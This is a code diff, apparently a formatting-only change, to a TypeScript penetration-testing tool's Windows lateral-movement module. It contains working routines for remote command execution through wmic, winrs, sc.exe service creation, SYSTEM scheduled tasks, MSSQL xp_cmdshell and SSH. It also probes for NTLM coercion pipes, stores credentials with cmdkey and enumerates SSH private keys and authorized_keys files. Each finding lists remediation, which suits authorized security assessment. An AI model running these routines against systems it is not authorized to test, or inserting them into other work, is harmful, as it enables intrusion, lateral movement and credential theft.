@@ -18,12 +18,20 @@ export async function wmiExec(args: string[], timeout: number): Promise<HookResu
     if (r.stdout.includes("ReturnValue = 0")) {
       output.push(`[+] Process created on ${target} via wmic`)
       findings.push({
-        checkId: "WIN-LAT-001", provider: "windows", severity: "critical", status: "EXECUTED",
-        resource: `wmi://${target}`, title: `WMI remote execution on ${target} (cmd)`,
-        details: `Command: ${command}`, remediation: "Restrict WMI access, enable Windows Firewall WMI rules, monitor WMI process creation events",
+        checkId: "WIN-LAT-001",
+        provider: "windows",
+        severity: "critical",
+        status: "EXECUTED",
+        resource: `wmi://${target}`,
+        title: `WMI remote execution on ${target} (cmd)`,
+        details: `Command: ${command}`,
+        remediation: "Restrict WMI access, enable Windows Firewall WMI rules, monitor WMI process creation events",
       })
     }
-    const procs = await cmd(`wmic /node:"${target}" ${credPart} process get ProcessId,Name,CommandLine /format:csv 2>nul`, timeout)
+    const procs = await cmd(
+      `wmic /node:"${target}" ${credPart} process get ProcessId,Name,CommandLine /format:csv 2>nul`,
+      timeout,
+    )
     if (procs.stdout) output.push("[+] Remote processes:\n" + procs.stdout.substring(0, 3000))
     return { output: output.join("\n"), findings }
   }
@@ -101,12 +109,21 @@ export async function winrmExec(args: string[], timeout: number): Promise<HookRe
     output.push(r.stdout || r.stderr)
     if (r.exitCode === 0) {
       output.push(`[+] WinRM command executed on ${target}`)
-      const sysinfo = await cmd(`winrs -r:${target} ${credPart} "hostname & whoami & systeminfo | findstr /C:\"OS Name\" /C:\"Domain\""`, timeout)
+      const sysinfo = await cmd(
+        `winrs -r:${target} ${credPart} "hostname & whoami & systeminfo | findstr /C:\"OS Name\" /C:\"Domain\""`,
+        timeout,
+      )
       if (sysinfo.stdout) output.push("[+] Remote system info:\n" + sysinfo.stdout)
       findings.push({
-        checkId: "WIN-LAT-002", provider: "windows", severity: "critical", status: "EXECUTED",
-        resource: `winrm://${target}`, title: `WinRM remote execution on ${target} (cmd/winrs)`,
-        details: `Command: ${command}`, remediation: "Restrict WinRM access with firewall rules, use JEA (Just Enough Administration), monitor PSRemoting events (Event ID 4103/4104)",
+        checkId: "WIN-LAT-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXECUTED",
+        resource: `winrm://${target}`,
+        title: `WinRM remote execution on ${target} (cmd/winrs)`,
+        details: `Command: ${command}`,
+        remediation:
+          "Restrict WinRM access with firewall rules, use JEA (Just Enough Administration), monitor PSRemoting events (Event ID 4103/4104)",
       })
     }
     return { output: output.join("\n"), findings }
@@ -208,9 +225,9 @@ export async function dcomExec(args: string[], timeout: number): Promise<HookRes
     output.push("[*] cmd.exe cannot directly create remote DCOM objects")
     output.push("")
     output.push("[*] Alternative approaches without PowerShell:")
-    output.push("    1. Use wmic for remote process creation: wmic /node:<target> process call create \"<cmd>\"")
+    output.push('    1. Use wmic for remote process creation: wmic /node:<target> process call create "<cmd>"')
     output.push("    2. Use schtasks for remote execution: schtasks /create /s <target> /tn name /tr <cmd> /sc once")
-    output.push("    3. Use sc.exe for service-based exec: sc \\\\<target> create svc binpath= \"cmd /c <cmd>\"")
+    output.push('    3. Use sc.exe for service-based exec: sc \\\\<target> create svc binpath= "cmd /c <cmd>"')
     output.push("    4. Use winrs for WinRM exec: winrs -r:<target> <cmd>")
     if (user && password) {
       const credStore = await cmd(`cmdkey /add:${target} /user:${user} /pass:${password}`, timeout)
@@ -338,7 +355,10 @@ export async function smbExec(args: string[], timeout: number): Promise<HookResu
       const binPath = `cmd.exe /c ${command} > ${outFile} 2>&1`
 
       output.push(`[*] Creating service '${svcName}' on ${target} via sc.exe...`)
-      const create = await cmd(`sc \\\\${target} create ${svcName} binpath= "${binPath}" type= own start= demand`, timeout)
+      const create = await cmd(
+        `sc \\\\${target} create ${svcName} binpath= "${binPath}" type= own start= demand`,
+        timeout,
+      )
       output.push(create.stdout || create.stderr)
 
       if (create.exitCode === 0 || (create.stdout && create.stdout.includes("SUCCESS"))) {
@@ -354,9 +374,15 @@ export async function smbExec(args: string[], timeout: number): Promise<HookResu
         output.push("[+] Service deleted: " + (del.stdout || ""))
 
         findings.push({
-          checkId: "WIN-LAT-004", provider: "windows", severity: "critical", status: "EXECUTED",
-          resource: `smb://${target}`, title: `SMB/SCM remote execution on ${target} (cmd/sc.exe)`,
-          details: `Command: ${command}`, remediation: "Restrict admin shares (C$, ADMIN$), monitor service creation events (Event ID 7045), restrict SCM access",
+          checkId: "WIN-LAT-004",
+          provider: "windows",
+          severity: "critical",
+          status: "EXECUTED",
+          resource: `smb://${target}`,
+          title: `SMB/SCM remote execution on ${target} (cmd/sc.exe)`,
+          details: `Command: ${command}`,
+          remediation:
+            "Restrict admin shares (C$, ADMIN$), monitor service creation events (Event ID 7045), restrict SCM access",
         })
       }
     }
@@ -500,21 +526,35 @@ export async function ntlmCoerce(args: string[], timeout: number): Promise<HookR
     output.push("[*] Checking pipe/service accessibility from cmd:")
 
     if (method === "petitpotam" || method === "all") {
-      const efsrpc = await cmd(`echo test | dir \\\\${target}\\pipe\\efsrpc 2>nul && echo EFSRPC_ACCESSIBLE || echo EFSRPC_NOT_FOUND`, timeout)
-      const lsarpc = await cmd(`echo test | dir \\\\${target}\\pipe\\lsarpc 2>nul && echo LSARPC_ACCESSIBLE || echo LSARPC_NOT_FOUND`, timeout)
-      output.push(`[*] PetitPotam (MS-EFSRPC): efsrpc pipe: ${efsrpc.stdout.includes("ACCESSIBLE") ? "accessible" : "not found"}, lsarpc: ${lsarpc.stdout.includes("ACCESSIBLE") ? "accessible" : "not found"}`)
+      const efsrpc = await cmd(
+        `echo test | dir \\\\${target}\\pipe\\efsrpc 2>nul && echo EFSRPC_ACCESSIBLE || echo EFSRPC_NOT_FOUND`,
+        timeout,
+      )
+      const lsarpc = await cmd(
+        `echo test | dir \\\\${target}\\pipe\\lsarpc 2>nul && echo LSARPC_ACCESSIBLE || echo LSARPC_NOT_FOUND`,
+        timeout,
+      )
+      output.push(
+        `[*] PetitPotam (MS-EFSRPC): efsrpc pipe: ${efsrpc.stdout.includes("ACCESSIBLE") ? "accessible" : "not found"}, lsarpc: ${lsarpc.stdout.includes("ACCESSIBLE") ? "accessible" : "not found"}`,
+      )
     }
     if (method === "printerbug" || method === "all") {
       const spooler = await cmd(`sc \\\\${target} query Spooler 2>nul`, timeout)
-      output.push(`[*] PrinterBug (MS-RPRN): Spooler: ${spooler.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`)
+      output.push(
+        `[*] PrinterBug (MS-RPRN): Spooler: ${spooler.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`,
+      )
     }
     if (method === "dfscoerce" || method === "all") {
       const dfs = await cmd(`sc \\\\${target} query Dfs 2>nul`, timeout)
-      output.push(`[*] DFSCoerce (MS-DFSNM): DFS: ${dfs.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`)
+      output.push(
+        `[*] DFSCoerce (MS-DFSNM): DFS: ${dfs.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`,
+      )
     }
     if (method === "shadowcoerce" || method === "all") {
       const vss = await cmd(`sc \\\\${target} query "File Server VSS Agent Service" 2>nul`, timeout)
-      output.push(`[*] ShadowCoerce (MS-FSRVP): VSS Agent: ${vss.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`)
+      output.push(
+        `[*] ShadowCoerce (MS-FSRVP): VSS Agent: ${vss.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`,
+      )
     }
 
     output.push("")
@@ -525,8 +565,12 @@ export async function ntlmCoerce(args: string[], timeout: number): Promise<HookR
     output.push("    - DFSCoerce.py: python3 dfscoerce.py -d domain -u user -p pass <listener> <target>")
 
     findings.push({
-      checkId: "WIN-LAT-005", provider: "windows", severity: "info", status: "GUIDANCE",
-      resource: `ntlm://${target}`, title: `NTLM coercion recon: ${method} on ${target} (cmd)`,
+      checkId: "WIN-LAT-005",
+      provider: "windows",
+      severity: "info",
+      status: "GUIDANCE",
+      resource: `ntlm://${target}`,
+      title: `NTLM coercion recon: ${method} on ${target} (cmd)`,
       details: `Pipe/service check from cmd.exe — use external tools for actual coercion`,
       remediation: "Disable unnecessary services (Spooler, EFS, DFS, VSS Agent), enforce SMB signing, enable EPA",
     })
@@ -680,7 +724,9 @@ export async function coercerFull(args: string[], timeout: number): Promise<Hook
   if (!listener && !checkOnly) return { output: "[!] Required: --listener IP (or use --check-only)", findings }
 
   if (activeExec === "cmd" || activeExec === "bat") {
-    output.push("[!] Extended NTLM coercion requires PS/.NET named pipe RPC — cmd.exe used for service/pipe enumeration")
+    output.push(
+      "[!] Extended NTLM coercion requires PS/.NET named pipe RPC — cmd.exe used for service/pipe enumeration",
+    )
     output.push("")
 
     const pipes = [
@@ -718,10 +764,15 @@ export async function coercerFull(args: string[], timeout: number): Promise<Hook
     output.push("    - PrintSpoofer/SpoolSample: SpoolSample.exe <target> <listener>")
 
     findings.push({
-      checkId: "WIN-COERCE-EXT-001", provider: "windows", severity: "info", status: "ENUMERATED",
-      resource: `ntlm://${target}`, title: `Extended coercion pipe/service enumeration (cmd)`,
+      checkId: "WIN-COERCE-EXT-001",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: `ntlm://${target}`,
+      title: `Extended coercion pipe/service enumeration (cmd)`,
       details: `Checked ${pipes.length} pipes and ${services.length} services on ${target}`,
-      remediation: "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
+      remediation:
+        "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
     })
     return { output: output.join("\n"), findings }
   }
@@ -962,10 +1013,15 @@ export async function remoteMonologue(args: string[], timeout: number): Promise<
     output.push("    4. External tools: Coercer.py, PetitPotam.exe, SpoolSample.exe")
 
     findings.push({
-      checkId: "WIN-RMON-001", provider: "windows", severity: "info", status: "GUIDANCE",
-      resource: `dcom://${target}`, title: `Remote Monologue DCOM check on ${target} (cmd)`,
+      checkId: "WIN-RMON-001",
+      provider: "windows",
+      severity: "info",
+      status: "GUIDANCE",
+      resource: `dcom://${target}`,
+      title: `Remote Monologue DCOM check on ${target} (cmd)`,
       details: `DCOM-based NTLM coercion requires PS/.NET — provided alternative approaches`,
-      remediation: "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA. Monitor DCOM activation events (10036)",
+      remediation:
+        "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA. Monitor DCOM activation events (10036)",
     })
     return { output: output.join("\n"), findings }
   }
@@ -1139,11 +1195,15 @@ export async function mssqlAbuse(args: string[], timeout: number): Promise<HookR
 
     if (r.stdout.includes("Version") || r.stdout.includes("xp_cmdshell")) {
       findings.push({
-        checkId: "WIN-LAT-006", provider: "windows", severity: "critical",
+        checkId: "WIN-LAT-006",
+        provider: "windows",
+        severity: "critical",
         status: action === "exec" ? "EXECUTED" : "ENUMERATED",
-        resource: `mssql://${server}`, title: `MSSQL ${action} on ${server} (cmd/sqlcmd)`,
+        resource: `mssql://${server}`,
+        title: `MSSQL ${action} on ${server} (cmd/sqlcmd)`,
         details: action === "exec" ? `Command: ${command}` : `Action: ${action}`,
-        remediation: "Disable xp_cmdshell, review linked servers, restrict IMPERSONATE, encrypt credentials in agent jobs",
+        remediation:
+          "Disable xp_cmdshell, review linked servers, restrict IMPERSONATE, encrypt credentials in agent jobs",
       })
     }
     return { output: output.join("\n"), findings }
@@ -1325,7 +1385,10 @@ export async function schtaskExec(args: string[], timeout: number): Promise<Hook
       const tasks = await cmd(`schtasks /Query /S "${target}" ${cred} /FO CSV /NH`, timeout)
       output.push(tasks.stdout || tasks.stderr)
       output.push("\n[*] Testing task creation permission...")
-      const test = await cmd(`schtasks /Create /S "${target}" ${cred} /TN "CS_PermTest" /TR "cmd /c echo test" /SC ONCE /ST 23:59 /F`, timeout)
+      const test = await cmd(
+        `schtasks /Create /S "${target}" ${cred} /TN "CS_PermTest" /TR "cmd /c echo test" /SC ONCE /ST 23:59 /F`,
+        timeout,
+      )
       if (test.exitCode === 0) {
         output.push("[+] Task creation ALLOWED — lateral movement possible")
         await cmd(`schtasks /Delete /S "${target}" ${cred} /TN "CS_PermTest" /F`, timeout)
@@ -1333,9 +1396,14 @@ export async function schtaskExec(args: string[], timeout: number): Promise<Hook
         output.push("[-] Task creation denied: " + (test.stderr || test.stdout))
       }
       findings.push({
-        checkId: "WIN-LAT-012", provider: "windows", severity: test.exitCode === 0 ? "high" : "info", status: "ENUMERATED",
-        resource: `schtask://${target}`, title: `Remote scheduled task enumeration on ${target} (cmd)`,
-        details: tasks.stdout.substring(0, 500), remediation: "Restrict remote task scheduler access. Monitor Event ID 4698.",
+        checkId: "WIN-LAT-012",
+        provider: "windows",
+        severity: test.exitCode === 0 ? "high" : "info",
+        status: "ENUMERATED",
+        resource: `schtask://${target}`,
+        title: `Remote scheduled task enumeration on ${target} (cmd)`,
+        details: tasks.stdout.substring(0, 500),
+        remediation: "Restrict remote task scheduler access. Monitor Event ID 4698.",
       })
     }
 
@@ -1345,7 +1413,10 @@ export async function schtaskExec(args: string[], timeout: number): Promise<Hook
       const wrappedCmd = `cmd.exe /c ${command} > ${outFile} 2>&1`
 
       output.push("[*] Step 1: Creating remote task...")
-      const create = await cmd(`schtasks /Create /S "${target}" ${cred} /TN "${taskName}" /TR "${wrappedCmd}" /SC ONCE /ST 00:00 /RU SYSTEM /F`, timeout)
+      const create = await cmd(
+        `schtasks /Create /S "${target}" ${cred} /TN "${taskName}" /TR "${wrappedCmd}" /SC ONCE /ST 00:00 /RU SYSTEM /F`,
+        timeout,
+      )
       if (create.exitCode !== 0) {
         output.push("[-] Task creation failed: " + (create.stderr || create.stdout))
         return { output: output.join("\n"), findings }
@@ -1366,10 +1437,14 @@ export async function schtaskExec(args: string[], timeout: number): Promise<Hook
       output.push("[+] Task deleted")
 
       findings.push({
-        checkId: "WIN-LAT-013", provider: "windows", severity: "critical",
+        checkId: "WIN-LAT-013",
+        provider: "windows",
+        severity: "critical",
         status: run.exitCode === 0 ? "EXECUTED" : "FAILED",
-        resource: `schtask://${target}/${taskName}`, title: `Remote command execution via schtasks on ${target} (cmd)`,
-        details: `Command: ${command}`, remediation: "Restrict remote task scheduler. Monitor Event ID 4698/4702.",
+        resource: `schtask://${target}/${taskName}`,
+        title: `Remote command execution via schtasks on ${target} (cmd)`,
+        details: `Command: ${command}`,
+        remediation: "Restrict remote task scheduler. Monitor Event ID 4698/4702.",
       })
     }
     return { output: output.join("\n"), findings }
@@ -1534,7 +1609,14 @@ export async function sshExec(args: string[], timeout: number): Promise<HookResu
       }
 
       const sshdSvc = await cmd(`sc query sshd 2>nul`, timeout)
-      output.push("[*] sshd service: " + (sshdSvc.stdout.includes("RUNNING") ? "RUNNING" : sshdSvc.stdout.includes("STOPPED") ? "STOPPED" : "not installed"))
+      output.push(
+        "[*] sshd service: " +
+          (sshdSvc.stdout.includes("RUNNING")
+            ? "RUNNING"
+            : sshdSvc.stdout.includes("STOPPED")
+              ? "STOPPED"
+              : "not installed"),
+      )
 
       output.push("\n=== SSH Keys and Known Hosts ===")
       const sshDir = await cmd(`dir %USERPROFILE%\\.ssh 2>nul`, timeout)
@@ -1555,19 +1637,25 @@ export async function sshExec(args: string[], timeout: number): Promise<HookResu
       }
 
       output.push("\n=== Other Users SSH Keys ===")
-      const otherUsers = await cmd(`for /d %u in (C:\\Users\\*) do @if exist "%u\\.ssh" echo [!] %u has .ssh directory`, timeout)
+      const otherUsers = await cmd(
+        `for /d %u in (C:\\Users\\*) do @if exist "%u\\.ssh" echo [!] %u has .ssh directory`,
+        timeout,
+      )
       if (otherUsers.stdout) output.push(otherUsers.stdout)
 
       const adminKeys = await cmd(`type %ProgramData%\\ssh\\administrators_authorized_keys 2>nul`, timeout)
       if (adminKeys.stdout) output.push("[!] Admin authorized_keys found:\n" + adminKeys.stdout)
 
       findings.push({
-        checkId: "WIN-LAT-010", provider: "windows",
-        severity: (sshDir.stdout && sshDir.stdout.includes("id_")) ? "high" : "info",
-        status: "ENUMERATED", resource: "ssh://local",
+        checkId: "WIN-LAT-010",
+        provider: "windows",
+        severity: sshDir.stdout && sshDir.stdout.includes("id_") ? "high" : "info",
+        status: "ENUMERATED",
+        resource: "ssh://local",
         title: "SSH discovery, key enumeration, known hosts mapping (cmd)",
         details: (sshDir.stdout || "").substring(0, 500),
-        remediation: "Protect SSH private keys with passphrases. Restrict .ssh directory permissions. Disable password authentication.",
+        remediation:
+          "Protect SSH private keys with passphrases. Restrict .ssh directory permissions. Disable password authentication.",
       })
     }
 
@@ -1581,9 +1669,12 @@ export async function sshExec(args: string[], timeout: number): Promise<HookResu
       output.push(r.stdout || r.stderr)
 
       findings.push({
-        checkId: "WIN-LAT-011", provider: "windows", severity: "high",
+        checkId: "WIN-LAT-011",
+        provider: "windows",
+        severity: "high",
         status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
-        resource: `ssh://${target}`, title: `SSH remote exec on ${target} (cmd)`,
+        resource: `ssh://${target}`,
+        title: `SSH remote exec on ${target} (cmd)`,
         details: `Command: ${command}`,
         remediation: "Restrict SSH access. Use key-based auth with passphrases. Enable SSH audit logging.",
       })
